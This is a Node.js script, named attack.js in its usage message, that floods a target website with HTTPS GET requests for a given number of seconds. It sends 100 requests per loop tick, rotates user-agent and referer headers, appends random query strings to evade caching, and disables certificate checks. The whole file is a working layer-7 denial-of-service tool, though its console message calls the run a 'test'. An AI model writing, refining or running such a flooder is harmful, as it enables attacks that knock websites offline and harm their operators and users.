const https = require('https');
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <target> <time>');
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const parsed = url.parse(target);

const uas = fs.readFileSync('ua.txt', 'utf-8').toString().split('\n').filter(Boolean);
const referers = fs.readFileSync('refs.txt', 'utf-8').toString().split('\n').filter(Boolean);

function ra() {
    return randstr.generate({ charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', length: 8 });
}

function sendRequest() {
    const path = parsed.path.includes('%RAND%') ? parsed.path.replace('%RAND%', ra()) : parsed.path;
    const options = {
        hostname: parsed.hostname,
        port: 443,
        path: path + '?' + ra(),
        method: 'GET',
        headers: {
            'User-Agent': uas[Math.floor(Math.random() * uas.length)],
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Connection': 'keep-alive'
        },
        rejectUnauthorized: false,
    };

    const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.end();
}

console.log(`Starting test on ${target} for ${time} seconds`);

const endTime = Date.now() + time * 1000;

function flood() {
    if (Date.now() > endTime) return;
    for (let i = 0; i < 100; i++) {
        sendRequest();
    }
    setImmediate(flood);
}

flood();
